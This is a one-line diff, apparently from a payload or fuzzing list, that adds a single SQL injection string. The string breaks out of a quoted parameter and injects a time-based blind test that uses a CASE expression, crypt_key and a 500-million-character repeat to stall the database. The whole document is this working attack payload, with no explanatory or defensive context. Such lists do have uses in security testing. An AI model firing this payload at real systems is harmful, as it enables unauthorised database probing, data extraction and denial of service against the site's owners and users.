@@ -1,0 +1,1 @@
+1")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--
